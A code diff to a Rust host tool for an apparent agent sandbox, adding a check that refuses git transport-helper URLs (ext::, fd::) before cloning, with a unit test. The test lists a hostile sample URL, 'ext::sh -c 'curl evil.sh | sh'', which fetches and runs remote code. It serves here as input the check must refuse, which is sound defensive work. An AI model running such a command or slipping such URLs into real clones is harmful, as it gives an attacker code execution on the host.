@@ -66,10 +66,32 @@ fn agentos_home() -> PathBuf {
     PathBuf::from(std::env::var_os("HOME").expect("HOME not set")).join(".agentos")
 }
 
+
+/// Reject git "transport helper" URLs (`ext::<cmd>`, `fd::…`), which make git
+/// execute an arbitrary command **on the host**. `--` stops option injection
+/// but not these. Repo URLs are user-supplied today, so this is defense in
+/// depth — it keeps a URL from becoming host code execution if one ever
+/// arrives from a less-trusted source (fleet policy, an agent's suggestion).
+fn reject_transport_helper(url: &str) -> Result<()> {
+    // Helper syntax is `<word>::rest`; a real URL's "::" only ever appears
+    // after a '/' (path) or inside an IPv6 authority.
+    if let Some((prefix, _)) = url.split_once("::") {
+        if !prefix.contains('/') && !prefix.contains('[') {
+            return Err(Error::InvalidSpec(format!(
+                "refusing git transport-helper URL {url:?}: \
+                 {prefix}:: can execute commands on the host"
+            )));
+        }
+    }
+    Ok(())
+}
+
 /// Clone `repo` into `dest` on the host. Runs the host's `git`, so it uses
 /// whatever credentials the host already has — none of which is exposed to
 /// the guest, which only ever sees the checked-out files. Shallow by default.
 async fn clone_repo(repo: &agentos_core::RepoSpec, dest: &std::path::Path) -> Result<()> {
+    reject_transport_helper(&repo.url)?;
+
     let mut cmd = tokio::process::Command::new("git");
     cmd.arg("clone").arg("--depth").arg("1");
     if let Some(r) = &repo.git_ref {
@@ -341,4 +363,30 @@ async fn drive(
         }
     }
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::reject_transport_helper;
+
+    #[test]
+    fn transport_helpers_rejected_ordinary_urls_allowed() {
+        for bad in [
+            "ext::sh -c 'curl evil.sh | sh'",
+            "fd::7",
+            "ext::git-upload-pack",
+        ] {
+            assert!(reject_transport_helper(bad).is_err(), "{bad} must be refused");
+        }
+        for ok in [
+            "https://github.com/octocat/Hello-World.git",
+            "git@github.com:octocat/Hello-World.git",
+            "ssh://git@host:22/repo.git",
+            "/local/path/repo",
+            // "::" legitimately appearing later in a URL is fine.
+            "https://host/weird::path.git",
+        ] {
+            assert!(reject_transport_helper(ok).is_ok(), "{ok} must be allowed");
+        }
+    }
 }
